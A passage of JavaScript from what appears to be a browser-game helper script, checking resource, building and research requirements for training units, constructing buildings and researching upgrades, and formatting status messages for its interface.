            var f = 5;
            var g = a * 5000;
            var h = a * 12;
            var i = a * 3000;
            var j = a * 9000;
            var k = 8;
            var l = 9;
            var m = a * 4000;
            var o = 10;
            var p = 10;
            var q = a * 260;
            var r = Seed.cities[0];
            var s = "FireTroop";
            try {
                var u = Seed.requirements.unit[s];
                f = u.research.Clairvoyance;
                g = a * u.resources.food;
                h = a * u.population.idle;
                i = a * u.resources.wood;
                j = a * u.resources.ore;
                k = u.buildings.Metalsmith;
                l = u.research.RapidDeployment;
                m = a * u.resources.stone;
                garrison_level = u.buildings.TrainingCamp;
                p = u.research.Ballistics
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var v = "";
            var n = translate("Required") + ":+ ";
            var w = {
                trainable: false,
                msg: []
            };
            var x = t.getUnitCap("FireTroop", a);
            if (x > 0) {
                v += translate("Capacity") + ": " + x + " + "
            }
            if (Seed.player.research.Clairvoyance < f) {
                v += translate("Clairvoyance") + ": " + f + " + "
            }
            if (r.resources.food < g) {
                v += translate("Food") + ": " + (g - r.resources.food) + " + "
            }
            var y = r.figures.population.current - r.figures.population.laborers - r.figures.population.armed_forces;
            y = (y > 0) ? y : 0;
            if (y < h) {
                v += translate("Peoble") + ": " + (h - y) + " + "
            }
            if (r.resources.wood < i) {
                v += translate("Wood") + ": " + (i - r.resources.wood) + " + "
            }
            if (r.resources.ore < j) {
                v += translate("Ore") + ": " + (j - r.resources.ore) + " + "
            }
            if (t.getBuildingLevel(0, "Metalsmith", k) === 0) {
                v += translate("Metalsmith") + ": " + k + " + "
            }
            if (Seed.player.research.RapidDeployment < l) {
                v += translate("RapidDeployment") + ": " + l + " + "
            }
            if (r.resources.stone < m) {
                v += translate("Stone") + ": " + (m - r.resources.stone) + " + "
            }
            if (t.getBuildingLevel(b, "TrainingCamp", o) === 0) {
                v += translate("TrainingCamp") + ": " + o + " + "
            }
            var z = t.getItem("FireTroopItem");
            if (z < a) {
                v += translate("Runes") + ": " + (a - z) + " + "
            }
            if (Seed.player.research.Ballistics < p) {
                v += translate("Ballistics") + ": " + p + " + "
            }
            if (t.getRemainingQueue(1, "units") === 0) {
                v += translate("Training queue") + " "
            }
            if (v.length === 0) {
                w.trainable = true;
                w.msg = a + " " + translate("FireTroop") + " " + translate("UpKeep") + " " + q + " " + translate("Food")
            } else {
                w.trainable = false;
                w.msg = n + v
            }
            return w
        },
        checkWindTroopReqs: function (a, b, c, d) {
            var t = Tabs.Jobs;
            var f = 3;
            var g = a * 2000;
            var h = a * 6;
            var i = 9;
            var j = a * 3000;
            var k = a * 3000;
            var l = 9;
            var m = a * 1000;
            var o = 10;
            var p = a * 50;
            var q = Seed.cities[0];
            var r = "WindTroop";
            try {
                var s = Seed.requirements.unit[r];
                f = s.research.AerialCombat;
                g = a * s.resources.food;
                h = a * s.population.idle;
                i = s.research.Levitation;
                j = a * s.resources.wood;
                k = a * s.resources.ore;
                l = s.research.RapidDeployment;
                m = a * s.resources.stone;
                garrison_level = s.buildings.TrainingCamp
            } catch (e) {
                verboseLog("Training: " + e.msg + " Manifest not available, using defaults")
            }
            var u = "";
            var n = translate("Required") + ":+ ";
            var v = {
                trainable: false,
                msg: []
            };
            var w = t.getUnitCap("WindTroop", a);
            if (w > 0) {
                u += translate("Capacity") + ": " + w + " + "
            }
            if (Seed.player.research.AerialCombat < f) {
                u += translate("AerialCombat") + ": " + f + " + "
            }
            if (q.resources.food < g) {
                u += translate("Food") + ": " + (g - q.resources.food) + " + "
            }
            var x = q.figures.population.current - q.figures.population.laborers - q.figures.population.armed_forces;
            x = (x > 0) ? x : 0;
            if (x < h) {
                u += translate("Peoble") + ": " + (h - x) + " + "
            }
            if (Seed.player.research.Levitation < i) {
                u += translate("Leviatation") + ": " + i + " + "
            }
            if (q.resources.wood < j) {
                u += translate("Wood") + ": " + (j - q.resources.wood) + " + "
            }
            if (q.resources.ore < k) {
                u += translate("Ore") + ": " + (k - q.resources.ore) + " + "
            }
            if (Seed.player.research.RapidDeployment < l) {
                u += translate("RapidDeployment") + ": " + l + " + "
            }
            if (q.resources.stone < m) {
                u += translate("Stone") + ": " + (m - q.resources.stone) + " + "
            }
            if (t.getBuildingLevel(b, "TrainingCamp", o) === 0) {
                u += translate("TrainingCamp") + ": " + o + " + "
            }
            var y = t.getItem("WindTroopItem");
            if (y < a) {
                u += translate("Talons") + ": " + (a - y) + " + "
            }
            if (t.getRemainingQueue(1, "units") === 0) {
                u += translate("Training queue") + " "
            }
            if (u.length === 0) {
                v.trainable = true;
                v.msg = a + " " + translate("WindTroop") + " " + translate("UpKeep") + " " + p + " " + translate("Food")
            } else {
                v.trainable = false;
                v.msg = n + u
            }
            return v
        },
        checkTrainReqs: function (a, b, c, d, e) {
            var t = Tabs.Jobs;
            var f = {};
            switch (a) {
            case "Porter":
                f = t.checkPorterReqs(b, c, d, e);
                break;
            case "Conscript":
                f = t.checkConscriptReqs(b, c, d, e);
                break;
            case "Spy":
                f = t.checkSpyReqs(b, c, d, e);
                break;
            case "Halberdsman":
                f = t.checkHalberdsmanReqs(b, c, d, e);
                break;
            case "Minotaur":
                f = t.checkMinotaurReqs(b, c, d, e);
                break;
            case "Longbowman":
                f = t.checkLongbowmanReqs(b, c, d, e);
                break;
            case "SwiftStrikeDragon":
                f = t.checkSwiftStrikeDragonReqs(b, c, d, e);
                break;
            case "BattleDragon":
                f = t.checkBattleDragonReqs(b, c, d, e);
                break;
            case "ArmoredTransport":
                f = t.checkArmoredTransportReqs(b, c, d, e);
                break;
            case "Giant":
                f = t.checkGiantReqs(b, c, d, e);
                break;
            case "FireMirror":
                f = t.checkFireMirrorReqs(b, c, d, e);
                break;
            case "AquaTroop":
                f = t.checkAquaTroopReqs(b, c, d, e);
                break;
            case "StoneTroop":
                f = t.checkStoneTroopReqs(b, c, d, e);
                break;
            case "FireTroop":
                f = t.checkFireTroopReqs(b, c, d, e);
                break;
            case "WindTroop":
                f = t.checkWindTroopReqs(b, c, d, e);
                break
            }
            return f
        },
        checkStandardReqs: function (a, b, c, d, f, g) {
            var t = Tabs.Jobs;
            var h = t.getLowestBuildingLevel(a, b);
            var i = "";
            var n = "L." + (h + 1) + " : ";
            if (h === 0) {
                i += " " + b
            }
            var j = c * Math.pow(2, h + 1);
            var k = d * Math.pow(2, h + 1);
            var l = f * Math.pow(2, h + 1);
            var m = g * Math.pow(2, h + 1);
            var o = Seed.cities[0];
            try {
                var p = Seed.requirements.building[b];
                j = p.level[h + 1].resources.food;
                k = p.level[h + 1].resources.wood;
                l = p.level[h + 1].resources.ore;
                m = p.level[h + 1].resources.stone
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var q = {
                buildable: false,
                isCapped: false,
                msg: []
            };
            var r = t.getBuildingCap(a, b);
            if (h >= r) {
                i += translate("Capacity") + ": " + r + " + "
            }
            if (o.resources.food < j) {
                i += translate("Food") + ": " + (j - o.resources.food) + " + "
            }
            if (o.resources.wood < k) {
                i += translate("Wood") + ": " + (k - o.resources.wood) + " + "
            }
            if (o.resources.ore < l) {
                i += translate("Ore") + ": " + (l - o.resources.ore) + " + "
            }
            if (o.resources.stone < m) {
                i += translate("Stone") + ": " + (m - o.resources.stone) + " + "
            }
            if (i.length === 0) {
                q.buildable = true;
                q.msg = "<b>" + translate("Building") + ":</b> " + translate(b) + "  (" + (h + 1) + ") "
            } else {
                q.isCapped = (h === r);
                q.buildable = false;
                q.msg = n + i
            }
            return q
        },
        checkGoldReqs: function (a, b, c, d, f, g, h) {
            var t = Tabs.Jobs;
            var i = t.getLowestBuildingLevel(a, b);
            var j = "";
            var n = "L." + (i + 1) + " : ";
            if (i === 0) {
                j += " " + b
            }
            var k = c * Math.pow(2, i + 1);
            var l = d * Math.pow(2, i + 1);
            var m = f * Math.pow(2, i + 1);
            var o = g * Math.pow(2, i + 1);
            var p = h * Math.pow(2, i + 1);
            var q = Seed.cities[0];
            try {
                var r = Seed.requirements.building[b];
                k = r.level[i + 1].resources.food;
                l = r.level[i + 1].resources.wood;
                m = r.level[i + 1].resources.ore;
                o = r.level[i + 1].resources.stone;
                p = r.level[i + 1].resources.gold
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var s = {
                buildable: false,
                isCapped: false,
                msg: []
            };
            var u = t.getBuildingCap(a, b);
            if (i >= u) {
                j += translate("Capacity") + ": " + u + " + "
            }
            if (q.resources.food < k) {
                j += translate("Food") + ": " + (k - q.resources.food) + " + "
            }
            if (q.resources.wood < l) {
                j += translate("Wood") + ": " + (l - q.resources.wood) + " + "
            }
            if (q.resources.ore < m) {
                j += translate("Ore") + ": " + (m - q.resources.ore) + " + "
            }
            if (q.resources.stone < o) {
                j += translate("Stone") + ": " + (o - q.resources.stone) + " + "
            }
            if (q.resources.gold < p) {
                j += translate("Gold") + ": " + (p - q.resources.gold) + " + "
            }
            if (j.length === 0) {
                s.buildable = true;
                s.msg = "<b>" + translate("Building") + ":</b> " + translate(b) + "  (" + (i + 1) + ") "
            } else {
                s.isCapped = (i === u);
                s.buildable = false;
                s.msg = n + j
            }
            return s
        },
        checkBuildReqs: function (a, b) {
            var t = Tabs.Jobs;
            var c;
            var d = t.getLowestBuildingLevel(a, b);
            var f = t.getBuildingCap(a, b);
            if (d < f) {
                switch (b) {
                case "Home":
                    c = t.checkStandardReqs(a, b, 50, 300, 150, 200);
                    break;
                case "Garrison":
                    c = t.checkStandardReqs(a, b, 250, 1200, 500, 1500);
                    break;
                case "ScienceCenter":
                    c = t.checkStandardReqs(a, b, 120, 1250, 200, 1500);
                    break;
                case "Metalsmith":
                    c = t.checkStandardReqs(a, b, 125, 1000, 1200, 600);
                    break;
                case "OfficerQuarter":
                    c = t.checkStandardReqs(a, b, 400, 2500, 700, 1200);
                    break;
                case "MusterPoint":
                    c = t.checkStandardReqs(a, b, 100, 600, 250, 2000);
                    break;
                case "Rookery":
                    c = t.checkGoldReqs(a, b, 1200, 2000, 1000, 800, 800);
                    break;
                case "StorageVault":
                    c = t.checkStandardReqs(a, b, 100, 1500, 300, 1000);
                    break;
                case "Theater":
                    c = t.checkStandardReqs(a, b, 300, 2000, 400, 1000);
                    break;
                case "Sentinel":
                    c = t.checkStandardReqs(a, b, 150, 1000, 300, 3000);
                    break;
                case "Factory":
                    c = t.checkStandardReqs(a, b, 150, 1500, 1500, 500);
                    break;
                case "Fortress":
                    c = t.checkStandardReqs(a, b, 200, 300, 100, 2500);
                    break;
                case "DragonKeep":
                    c = t.checkGoldReqs(a, b, 400, 2500, 700, 1200, 1500);
                    break;
                case "Wall":
                    c = t.checkStandardReqs(a, b, 3000, 1500, 500, 10000);
                    break;
                case "Mine":
                    c = t.checkStandardReqs(a, b, 210, 600, 200, 500);
                    break;
                case "Farm":
                    c = t.checkStandardReqs(a, b, 50, 300, 150, 200);
                    break;
                case "Lumbermill":
                    c = t.checkStandardReqs(a, b, 100, 100, 300, 250);
                    break;
                case "Quarry":
                    c = t.checkStandardReqs(a, b, 180, 500, 400, 150);
                    break;
                case "TrainingCamp":
                    c = t.checkGoldReqs(a, b, 350, 1300, 600, 1900, 975);
                    break;
                case "Silo":
                    c = t.checkStandardReqs(a, b, 250, 1200, 500, 1500);
                    break;
                case "EnergyCollector":
                    c = t.checkGoldReqs(a, b, 100, 500, 200, 300, 500);
                    break;
                case "DarkPortal":
                    c = t.checkGoldReqs(a, b, 250, 1200, 500, 1500, 2000);
                    break;
                case "Mausoleum":
                    c = t.checkGoldReqs(a, b, 150, 500, 200, 200, 1000);
                    break
                }
                if (c.buildable === false) {
                    if (t.content_type === 2) {
                        try {
                            $id(UID["tabJobBuild_FB_" + a + "_" + b]).innerHTML = '<font color="#C33">' + c.msg.replace(/:\+/, ":").replace(/\+\s*$/, "") + "</font>";
                            $id(UID["tabJobBuild_FB_" + a + "_" + b]).title = translate(b) + " " + c.msg.replace(/\+/g, " \n");
                            $id(UID["tabJobBuild_Cap_" + a + "_" + b]).style.color = "#C33"
                        } catch (e) {}
                    }
                } else {
                    if (t.content_type === 2) {
                        try {
                            var g = translate("Next level") + " " + translate("OK");
                            $id(UID["tabJobBuild_FB_" + a + "_" + b]).innerHTML = g;
                            $id(UID["tabJobBuild_FB_" + a + "_" + b]).title = translate(b) + " \n" + g
                        } catch (e) {}
                    }
                }
                return c
            } else {
                if (t.content_type === 2) {
                    try {
                        var g = translate("Task Completed");
                        $id(UID["tabJobBuild_FB_" + a + "_" + b]).innerHTML = "<font color=#0B0>" + g + "</font>";
                        $id(UID["tabJobBuild_FB_" + a + "_" + b]).title = translate(b) + " \n" + g;
                        $id(UID["tabJobBuild_Cap_" + a + "_" + b]).style.color = "#060"
                    } catch (e) {}
                }
            }
            return false
        },
        checkAgricultureReqs: function () {
            var t = Tabs.Jobs;
            var a = "Agriculture";
            var b = t.getCurrentResearchLevel(a);
            var c = 500 * Math.pow(2, b + 1);
            var d = 250 * Math.pow(2, b + 1);
            var f = 100 * Math.pow(2, b + 1);
            var g = b + 1;
            var h = b;
            var i = "";
            var n = "L." + (b + 1) + " : ";
            var j = Seed.cities[0];
            try {
                var k = Seed.requirements.research[a];
                d = k.level[b + 1].resources.food;
                c = k.level[b + 1].resources.gold;
                f = k.level[b + 1].resources.ore;
                h = k.level[b + 1].buildings.ScienceCenter;
                g = k.level[b + 1].buildings.Farm
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var l = {
                researchable: false,
                msg: []
            };
            var m = t.getResearchCap(a);
            if (b >= m) {
                i += translate("Capacity") + ": " + m + " + "
            }
            if (j.resources.food < d) {
                i += translate("Food") + ": " + (d - j.resources.food) + " + "
            }
            if (j.resources.gold < c) {
                i += translate("Gold") + ": " + (c - j.resources.gold) + " + "
            }
            if (j.resources.ore < f) {
                i += translate("Ore") + ": " + (f - j.resources.ore) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", h) === 0) {
                i += translate("ScienceCenter") + ": " + h + " + "
            }
            if (t.getBuildingLevel(0, "Farm", g) === 0) {
                i += translate("Farm") + ": " + g + " + "
            }
            if (i.length === 0) {
                l.researchable = true;
                l.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                l.researchable = false;
                l.msg = n + i
            }
            return l
        },
        checkWoodcraftReqs: function () {
            var t = Tabs.Jobs;
            var a = "Woodcraft";
            var b = t.getCurrentResearchLevel(a);
            var c = 1200 * Math.pow(2, b + 1);
            var d = 500 * Math.pow(2, b + 1);
            var f = 100 * Math.pow(2, b + 1);
            var g = b + 1;
            var h = b;
            var i = "";
            var n = "L." + (b + 1) + " : ";
            var j = Seed.cities[0];
            try {
                var k = Seed.requirements.research[a];
                c = k.level[b + 1].resources.gold;
                d = k.level[b + 1].resources.wood;
                f = k.level[b + 1].resources.ore;
                h = k.level[b + 1].buildings.ScienceCenter;
                g = k.level[b + 1].buildings.Lumbermill
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var l = {
                researchable: false,
                msg: []
            };
            var m = t.getResearchCap(a);
            if (b >= m) {
                i += translate("Capacity") + ": " + m + " + "
            }
            if (j.resources.gold < c) {
                i += translate("Gold") + ": " + (c - j.resources.gold) + " + "
            }
            if (j.resources.wood < d) {
                i += translate("Wood") + ": " + (d - j.resources.wood) + " + "
            }
            if (j.resources.ore < f) {
                i += translate("Ore") + ": " + (f - j.resources.ore) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", h) === 0) {
                i += translate("ScienceCenter") + ": " + h + " + "
            }
            if (t.getBuildingLevel(0, "Lumbermill", g) === 0) {
                i += translate("Lumbermill") + ": " + g + " + "
            }
            if (i.length === 0) {
                l.researchable = true;
                l.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                l.researchable = false;
                l.msg = n + i
            }
            return l
        },
        checkMasonryReqs: function () {
            var t = Tabs.Jobs;
            var a = "Masonry";
            var b = t.getCurrentResearchLevel(a);
            var c = 1500 * Math.pow(2, b + 1);
            var d = 500 * Math.pow(2, b + 1);
            var f = 200 * Math.pow(2, b + 1);
            var g = b + 1;
            var h = b;
            var i = "";
            var n = "L." + (b + 1) + " : ";
            var j = Seed.cities[0];
            try {
                var k = Seed.requirements.research[a];
                c = k.level[b + 1].resources.gold;
                d = k.level[b + 1].resources.stone;
                f = k.level[b + 1].resources.ore;
                h = k.level[b + 1].buildings.ScienceCenter;
                g = k.level[b + 1].buildings.Quarry
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var l = {
                researchable: false,
                msg: []
            };
            var m = t.getResearchCap(a);
            if (b >= m) {
                i += translate("Capacity") + ": " + m + " + "
            }
            if (j.resources.gold < c) {
                i += translate("Gold") + ": " + (c - j.resources.gold) + " + "
            }
            if (j.resources.stone < d) {
                i += translate("Stone") + ": " + (d - j.resources.stone) + " + "
            }
            if (j.resources.ore < f) {
                i += translate("Ore") + ": " + (f - j.resources.ore) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", h) === 0) {
                i += translate("ScienceCenter") + ": " + h + " + "
            }
            if (t.getBuildingLevel(0, "Quarry", g) === 0) {
                i += translate("Quarry") + ": " + g + " + "
            }
            if (i.length === 0) {
                l.researchable = true;
                l.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                l.researchable = false;
                l.msg = n + i
            }
            return l
        },
        checkMiningReqs: function () {
            var t = Tabs.Jobs;
            var a = "Mining";
            var b = t.getCurrentResearchLevel(a);
            var c = 2000 * Math.pow(2, b + 1);
            var d = 800 * Math.pow(2, b + 1);
            var f = b + 1;
            var g = b;
            var h = "";
            var n = "L." + (b + 1) + " : ";
            var i = Seed.cities[0];
            try {
                var j = Seed.requirements.research[a];
                c = j.level[b + 1].resources.gold;
                d = j.level[b + 1].resources.ore;
                g = j.level[b + 1].buildings.ScienceCenter;
                f = j.level[b + 1].buildings.Mine
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var k = {
                researchable: false,
                msg: []
            };
            var l = t.getResearchCap(a);
            if (b >= l) {
                h += translate("Capacity") + ": " + l + " + "
            }
            if (i.resources.gold < c) {
                h += translate("Gold") + ": " + (c - i.resources.gold) + " + "
            }
            if (i.resources.ore < d) {
                h += translate("Ore") + ": " + (d - i.resources.ore) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", g) === 0) {
                h += translate("ScienceCenter") + ": " + g + " + "
            }
            if (t.getBuildingLevel(0, "Mine", f) === 0) {
                h += translate("Mine") + ": " + f + " + "
            }
            if (h.length === 0) {
                k.researchable = true;
                k.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                k.researchable = false;
                k.msg = n + h
            }
            return k
        },
        checkClairvoyanceReqs: function () {
            var t = Tabs.Jobs;
            var a = "Clairvoyance";
            var b = t.getCurrentResearchLevel(a);
            var c = 2000 * Math.pow(2, b + 1);
            var d = 2400 * Math.pow(2, b + 1);
            var f = b;
            var g = "";
            var n = "L." + (b + 1) + " : ";
            var h = Seed.cities[0];
            try {
                var i = Seed.requirements.research[a];
                d = i.level[b + 1].resources.food;
                c = i.level[b + 1].resources.gold;
                f = i.level[b + 1].buildings.ScienceCenter
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var j = {
                researchable: false,
                msg: []
            };
            var k = t.getResearchCap(a);
            if (b >= k) {
                g += translate("Capacity") + ": " + k + " + "
            }
            if (h.resources.food < d) {
                g += translate("Food") + ": " + (d - h.resources.food) + " + "
            }
            if (h.resources.gold < c) {
                g += translate("Wood") + ": " + (c - h.resources.gold) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", f) === 0) {
                g += translate("ScienceCenter") + ": " + f + " + "
            }
            if (g.length === 0) {
                j.researchable = true;
                j.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                j.researchable = false;
                j.msg = n + g
            }
            return j
        },
        checkRapidDeploymentReqs: function () {
            var t = Tabs.Jobs;
            var a = "RapidDeployment";
            var b = t.getCurrentResearchLevel(a);
            var c = 600 * Math.pow(2, b + 1);
            var d = 3000 * Math.pow(2, b + 1);
            var f = b;
            var g = "";
            var n = "L." + (b + 1) + " : ";
            var h = Seed.cities[0];
            try {
                var i = Seed.requirements.research[a];
                d = i.level[b + 1].resources.food;
                c = i.level[b + 1].resources.gold;
                f = i.level[b + 1].buildings.ScienceCenter
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var j = {
                researchable: false,
                msg: []
            };
            var k = t.getResearchCap(a);
            if (b >= k) {
                g += translate("Capacity") + ": " + k + " + "
            }
            if (h.resources.food < d) {
                g += translate("Food") + ": " + (d - h.resources.food) + " + "
            }
            if (h.resources.gold < c) {
                g += translate("Wood") + ": " + (c - h.resources.gold) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", f) === 0) {
                g += translate("ScienceCenter") + ": " + f + " + "
            }
            if (g.length === 0) {
                j.researchable = true;
                j.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                j.researchable = false;
                j.msg = n + g
            }
            return j
        },
        checkBallisticsReqs: function () {
            var t = Tabs.Jobs;
            var a = "Ballistics";
            var b = t.getCurrentResearchLevel(a);
            var c = 5000 * Math.pow(2, b + 1);
            var d = 500 * Math.pow(2, b + 1);
            var f = 600 * Math.pow(2, b + 1);
            var g = 800 * Math.pow(2, b + 1);
            var h = 4;
            var i = b;
            var j = "";
            var n = "L." + (b + 1) + " : ";
            var k = Seed.cities[0];
            try {
                var l = Seed.requirements.research[a];
                c = l.level[b + 1].resources.gold;
                d = l.level[b + 1].resources.stone;
                f = l.level[b + 1].resources.ore;
                g = l.level[b + 1].resources.wood;
                i = l.level[b + 1].buildings.ScienceCenter;
                h = l.level[b + 1].research.Woodcraft
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var m = {
                researchable: false,
                msg: []
            };
            var o = t.getResearchCap(a);
            if (b >= o) {
                j += translate("Capacity") + ": " + o + " + "
            }
            if (k.resources.gold < c) {
                j += translate("Gold") + ": " + (c - k.resources.gold) + " + "
            }
            if (k.resources.stone < d) {
                j += translate("Stone") + ": " + (d - k.resources.stone) + " + "
            }
            if (k.resources.ore < f) {
                j += translate("Ore") + ": " + (f - k.resources.ore) + " + "
            }
            if (k.resources.wood < g) {
                j += translate("Wood") + ": " + (g - k.resources.wood) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", i) === 0) {
                j += translate("ScienceCenter") + ": " + i + " + "
            }
            if (t.getCurrentResearchLevel("Woodcraft") < h) {
                j += translate("Woodcraft") + ": " + h + " + "
            }
            if (j.length === 0) {
                m.researchable = true;
                m.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                m.researchable = false;
                m.msg = n + j
            }
            return m
        },
        checkMetallurgyReqs: function () {
            var t = Tabs.Jobs;
            var a = "Metallurgy";
            var b = t.getCurrentResearchLevel(a);
            var c = 800 * Math.pow(2, b + 1);
            var d = 3500 * Math.pow(2, b + 1);
            var f = 200 * Math.pow(2, b + 1);
            var g = 3000 * Math.pow(2, b + 1);
            var h = 150 * Math.pow(2, b + 1);
            var i = b;
            var j = b;
            var k = b;
            var l = 2;
            var m = "";
            var n = "L." + (b + 1) + " : ";
            var o = Seed.cities[0];
            try {
                var p = Seed.requirements.research[a];
                c = p.level[b + 1].resources.food;
                d = p.level[b + 1].resources.gold;
                f = p.level[b + 1].resources.stone;
                g = p.level[b + 1].resources.ore;
                h = p.level[b + 1].resources.wood;
                j = p.level[b + 1].buildings.ScienceCenter;
                k = p.level[b + 1].buildings.Metalsmith;
                l = p.level[b + 1].buildings.Garrison;
                i = p.level[b + 1].research.Mining
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var q = {
                researchable: false,
                msg: []
            };
            var r = t.getResearchCap(a);
            if (b >= r) {
                m += translate("Capacity") + ": " + r + " + "
            }
            if (o.resources.food < c) {
                m += translate("Food") + ": " + (c - o.resources.food) + " + "
            }
            if (o.resources.gold < d) {
                m += translate("Gold") + ": " + (d - o.resources.gold) + " + "
            }
            if (o.resources.stone < f) {
                m += translate("Stone") + ": " + (f - o.resources.stone) + " + "
            }
            if (o.resources.ore < g) {
                m += translate("Ore") + ": " + (g - o.resources.ore) + " + "
            }
            if (o.resources.wood < h) {
                m += translate("Wood") + ": " + (h - o.resources.wood) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", j) === 0) {
                m += translate("ScienceCenter") + ": " + j + " + "
            }
            if (t.getBuildingLevel(0, "Metalsmith", k) === 0) {
                m += translate("Metalsmith") + ": " + k + " + "
            }
            if (t.getBuildingLevel(0, "Garrison", l) === 0) {
                m += translate("Garrison") + ": " + l + " + "
            }
            if (t.getCurrentResearchLevel("Mining") < i) {
                m += translate("Mining") + ": " + i + " + "
            }
            if (m.length === 0) {
                q.researchable = true;
                q.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                q.researchable = false;
                q.msg = n + m
            }
            return q
        },
        checkMedicineReqs: function () {
            var t = Tabs.Jobs;
            var a = "Medicine";
            var b = t.getCurrentResearchLevel(a);
            var c = 3600 * Math.pow(2, b + 1);
            var d = 1500 * Math.pow(2, b + 1);
            var f = b;
            var g = "";
            var n = "L." + (b + 1) + " : ";
            var h = Seed.cities[0];
            try {
                var i = Seed.requirements.research[a];
                d = i.level[b + 1].resources.food;
                c = i.level[b + 1].resources.gold;
                f = i.level[b + 1].buildings.ScienceCenter
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var j = {
                researchable: false,
                msg: []
            };
            var k = t.getResearchCap(a);
            if (b >= k) {
                g += translate("Capacity") + ": " + k + " + "
            }
            if (h.resources.food < d) {
                g += translate("Food") + ": " + (d - h.resources.food) + " + "
            }
            if (h.resources.gold < c) {
                g += translate("Gold") + ": " + (c - h.resources.gold) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", f) === 0) {
                g += translate("ScienceCenter") + ": " + f + " + "
            }
            if (g.length === 0) {
                j.researchable = true;
                j.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                j.researchable = false;
                j.msg = n + g
            }
            return j
        },
        checkDragonryReqs: function () {
            var t = Tabs.Jobs;
            var a = "Dragonry";
            var b = t.getCurrentResearchLevel(a);
            var c = 5000 * Math.pow(2, b + 1);
            var d = 2500 * Math.pow(2, b + 1);
            var f = 1000 * Math.pow(2, b + 1);
            var g = b;
            var h = b;
            var i = "";
            var n = "L." + (b + 1) + " : ";
            var j = Seed.cities[0];
            try {
                var k = Seed.requirements.research[a];
                c = k.level[b + 1].resources.gold;
                d = k.level[b + 1].resources.food;
                f = k.level[b + 1].resources.ore;
                g = k.level[b + 1].buildings.ScienceCenter;
                h = k.level[b + 1].buildings.Rookery
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var l = {
                researchable: false,
                msg: []
            };
            var m = t.getResearchCap(a);
            if (b >= m) {
                i += translate("Capacity") + ": " + m + " + "
            }
            if (j.resources.gold < c) {
                i += translate("Gold") + ": " + (c - j.resources.gold) + " + "
            }
            if (j.resources.food < d) {
                i += translate("Food") + ": " + (d - j.resources.food) + " + "
            }
            if (j.resources.ore < f) {
                i += translate("Ore") + ": " + (f - j.resources.ore) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", g) === 0) {
                i += translate("ScienceCenter") + ": " + g + " + "
            }
            if (t.getBuildingLevel(0, "Rookery", h) === 0) {
                i += translate("Rookery") + ": " + h + " + "
            }
            if (i.length === 0) {
                l.researchable = true;
                l.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                l.researchable = false;
                l.msg = n + i
            }
            return l
        },
        checkLevitationReqs: function () {
            var t = Tabs.Jobs;
            var a = "Levitation";
            var b = t.getCurrentResearchLevel(a);
            var c = 5000 * Math.pow(2, b + 1);
            var d = 2000 * Math.pow(2, b + 1);
            var f = 2000 * Math.pow(2, b + 1);
            var g = b + 1;
            var h = b + 1;
            var i = "";
            var n = "L." + (b + 1) + " : ";
            var j = Seed.cities[0];
            try {
                var k = Seed.requirements.research[a];
                c = k.level[b + 1].resources.gold;
                d = k.level[b + 1].resources.wood;
                f = k.level[b + 1].resources.ore;
                g = k.level[b + 1].buildings.ScienceCenter;
                h = k.level[b + 1].research.Woodcraft
            } catch (e) {
                verboseLog("Building: " + e.msg + " Manifest not available, using defaults")
            }
            var l = {
                researchable: false,
                msg: []
            };
            var m = t.getResearchCap(a);
            if (b >= m) {
                i += translate("Capacity") + ": " + m + " + "
            }
            if (j.resources.gold < c) {
                i += translate("Gold") + ": " + (c - j.resources.gold) + " + "
            }
            if (j.resources.wood < d) {
                i += translate("Wood") + ": " + (d - j.resources.wood) + " + "
            }
            if (j.resources.ore < f) {
                i += translate("Ore") + ": " + (f - j.resources.ore) + " + "
            }
            if (t.getBuildingLevel(0, "ScienceCenter", g) === 0) {
                i += translate("ScienceCenter") + ": " + g + " + "
            }
            if (t.getCurrentResearchLevel("Woodcraft") < h) {
                i += translate("Woodcraft") + ": " + h + " + "
            }
            if (i.length === 0) {
                l.researchable = true;
                l.msg = "<b> " + translate("Researching") + ": </b> " + translate(a) + " (" + (b + 1) + ") "
            } else {
                l.researchable = false;
                l.msg = n + i
            }
